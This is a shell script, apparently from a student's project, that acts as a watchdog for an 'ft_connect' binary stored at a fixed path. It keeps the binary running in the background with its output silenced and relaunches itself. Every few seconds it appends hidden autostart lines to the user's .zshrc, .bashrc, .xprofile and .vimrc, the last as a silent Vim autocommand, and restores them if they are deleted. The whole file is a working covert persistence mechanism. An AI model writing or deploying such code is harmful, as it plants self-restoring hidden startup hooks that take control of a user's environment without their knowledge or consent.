#!/bin/sh

WATCHDOG_TAG="FT_CONNECT_WATCHDOG"

BIN_PATH="/sgoinfre/goinfre/Perso/zcadinot/script/fc/ft_connect/src/core/ft_connect"

AUTOSTART_TAG="# FT_CONNECT_AUTOSTART"
AUTOSTART_LINE="(nohup $BIN_PATH >/dev/null 2>&1 &) $AUTOSTART_TAG"

VIM_TAG="FT_CONNECT_VIM_AUTOSTART"
VIM_LINE="autocmd VimEnter * silent! call system('nohup $BIN_PATH >/dev/null 2>&1 &') \" $VIM_TAG"

SHELL_FILES="
$HOME/.zshrc
$HOME/.bashrc
$HOME/.xprofile
"

VIM_FILE="$HOME/.vimrc"

SLEEP_TIME=5
INJECT_CHECK_TIME=5
LAST_INJECT=0


is_bin_running()
{
	pgrep -f "$BIN_PATH" > /dev/null
}

inject_shell_autostart()
{
	for FILE in $SHELL_FILES
	do
		[ -f "$FILE" ] || continue
		if ! grep -q "$AUTOSTART_TAG" "$FILE"; then
			echo "" >> "$FILE"
			echo "$AUTOSTART_LINE" >> "$FILE"
		fi
	done
}

inject_vim_autostart()
{
	[ -f "$VIM_FILE" ] || return
	if ! grep -q "$VIM_TAG" "$VIM_FILE"; then
		echo "" >> "$VIM_FILE"
		echo "$VIM_LINE" >> "$VIM_FILE"
	fi
}

# anti double watchdog
if ps -ef | grep "$WATCHDOG_TAG" | grep -v grep > /dev/null; then
	exit 0
fi

nohup sh "$0" "$WATCHDOG_TAG" >/dev/null 2>&1 &

while true
do
	if ! is_bin_running; then
		nohup "$BIN_PATH" >/dev/null 2>&1 &
	fi

	NOW=$(date +%s)
	if [ $((NOW - LAST_INJECT)) -ge $INJECT_CHECK_TIME ]; then
		inject_shell_autostart
		inject_vim_autostart
		LAST_INJECT=$NOW
	fi

	sleep $SLEEP_TIME
done
